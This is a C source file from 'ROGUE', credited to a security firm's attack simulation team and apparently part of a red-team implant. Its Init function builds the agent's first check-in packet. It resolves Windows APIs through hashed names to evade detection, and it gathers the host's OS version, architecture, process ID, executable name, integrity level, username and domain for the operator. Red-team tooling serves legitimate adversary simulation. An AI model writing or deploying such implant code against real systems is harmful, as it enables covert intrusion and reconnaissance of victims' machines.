/*!
 *
 * ROGUE
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#include "Common.h"

typedef struct
{
	D_API( NtQueryInformationProcess );
	D_API( RtlGetVersion );
} API ;

typedef struct __attribute__(( packed ))
{
	UINT8	IsAmdx64;
	UINT8	VerMajor;
	UINT8	VerMinor;
	UINT16	VerBuild;
	UINT32	Pid;
	UINT8	Process[ 0 ];
} ROGUE_INIT, *PROGUE_INIT ;

/* API Hashes */
#define H_API_NTQUERYINFORMATIONPROCESS		0x8cdc5dc2 /* NtQueryInformationProcess */
#define H_API_RTLGETVERSION			0x0dde5cdd /* RtlGetVersion */

/* LIB Hashes */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */		

/*!
 *
 * Purpose:
 *
 * Creates the initial hello packet, and stores it in the
 * output buffer. Attempts to initialize the context 
 * structure.
 *
!*/
D_SEC( B ) BOOL Init( _In_ PROGUE_CTX Context, _In_ PBUFFER Output )
{
	API				Api;
	UNICODE_STRING			Exe;
	RTL_OSVERSIONINFOEXW		Ros;

	SIZE_T				Len = 0;

	BOOLEAN				Ret = FALSE;

	PCHAR				Int = NULL;
	PCHAR				Usr = NULL;
	PCHAR				Dmn = NULL;
	PBUFFER				Out = NULL;
	PROGUE_INIT			Ini = NULL;
	PUNICODE_STRING			Pth = NULL;

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Exe, sizeof( Exe ) );
	RtlZeroMemory( &Ros, sizeof( Ros ) );

	Api.NtQueryInformationProcess = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_NTQUERYINFORMATIONPROCESS ) );
	Api.RtlGetVersion             = PeGetFuncEat( PebGetModule( E_HSH( H_LIB_NTDLL ) ), E_HSH( H_API_RTLGETVERSION ) );

	/* Get the process image full path size */
	if ( ! NT_SUCCESS( Api.NtQueryInformationProcess( NtCurrentProcess(), ProcessImageFileName, NULL, 0, &Len ) ) ) {
		/* Allocate the path structure */
		if ( ( Pth = MemoryAlloc( Len ) ) != NULL ) {
			if ( NT_SUCCESS( Api.NtQueryInformationProcess( NtCurrentProcess(), ProcessImageFileName, Pth, Len, &Len ) ) ) {
				/* Loop through each character */
				for ( USHORT Idx = ( Pth->Length / sizeof( WCHAR ) ) - 1 ; Idx != 0 ; --Idx ) {
					/* Has a path character indicating folder path */
					if ( Pth->Buffer[ Idx ] == L'\\' || Pth->Buffer[ Idx ] == L'/' ) {
						/* Set the buffer to start after the first path character */
						Exe.Buffer = C_PTR( & Pth->Buffer[ Idx + 1 ] );
						Exe.Length = Pth->Length - ( Idx + 1 ) * sizeof( WCHAR );
						Exe.MaximumLength = Pth->MaximumLength - ( Idx + 1 ) * sizeof( WCHAR );
						break;
					};
				};
				/* Did we find the EXE? */
				if ( Exe.Buffer != NULL ) 
				{
					Ros.dwOSVersionInfoSize = sizeof( RTL_OSVERSIONINFOEXW );

					/* Query the build version for the process! */
					if ( NT_SUCCESS( Api.RtlGetVersion( C_PTR( &Ros ) ) ) ) {
						/* Create the output buffer to append */
						if ( ( Out = BufferCreate() ) != NULL ) {
							/* Extend to support the initial header */
							if ( BufferExtend( Out, sizeof( ROGUE_INIT ) ) ) {

								/* Get the process integrity information */
								Int = ProcIntegrityStr( NtCurrentTeb()->ClientId.UniqueProcess );
								Ini = C_PTR( Out->Buffer );
						
								/* Set init packet information */
								#if defined( _WIN64 )
								Ini->IsAmdx64 = TRUE;
								#else
								Ini->IsAmdx64 = FALSE;
								#endif
								Ini->VerMajor = Ros.dwMajorVersion;
								Ini->VerMinor = Ros.dwMinorVersion;
								Ini->VerBuild = Ros.dwBuildNumber;
								Ini->Pid      = NtCurrentTeb()->ClientId.UniqueProcess;

								/* Get the username and domain information */
								if ( ProcUserStr( NtCurrentTeb()->ClientId.UniqueProcess, &Usr, &Dmn ) ) {
									/* Append the process, integrity, domain, and user information */
									if ( BufferPrintf( Out, C_PTR( G_PTR( "%S\t%s\t%s\t%s\n" ) ), Exe.Buffer, Int, Dmn, Usr ) ) {
										Ret = BufferAddRaw( Output, Out->Buffer, Out->Length );
									};
									if ( Usr != NULL ) {
										MemoryFree( Usr );
									}
									if ( Dmn != NULL ) {
										MemoryFree( Dmn );
									};
								};
							};
							/* Clear the output buffer */
							BufferClear( Out );
						};
					};
				};
			};
			/* Free the path */
			MemoryFree( Pth );
		};
	};

	/* Zero out stack structures */
	RtlZeroMemory( &Api, sizeof( Api ) );
	RtlZeroMemory( &Exe, sizeof( Exe ) );
	RtlZeroMemory( &Ros, sizeof( Ros ) );

	/* Return status */
	return Ret;
};
